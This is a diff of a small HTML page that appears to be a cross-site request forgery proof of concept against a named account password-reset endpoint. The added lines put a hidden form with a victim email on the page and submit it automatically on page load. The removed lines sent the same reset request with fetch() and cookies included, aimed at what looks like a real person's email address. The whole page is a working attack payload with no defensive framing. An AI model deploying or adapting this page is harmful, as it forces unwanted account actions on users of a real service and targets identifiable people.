@@ -1,15 +1,12 @@
 <!doctype html>
 <html>
   <body>
+    <form action="secure.tessituranetwork.com/api/account/login/reset" method="POST">
+      <input type="hidden" name="email" value="victim@example.com">
+    </form>
     <script>
-      fetch("secure.tessituranetwork.com/api/account/login/reset", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ email: "johnny_scott@hotmail.com" }),
-        mode: "cors",
-        credentials: "include" // send cookies if any exist
-      }).then(r => console.log("status", r.status))
-        .catch(e => console.error(e));
+      // Auto-submit on page load
+      document.forms[0].submit();
     </script>
   </body>
 </html>
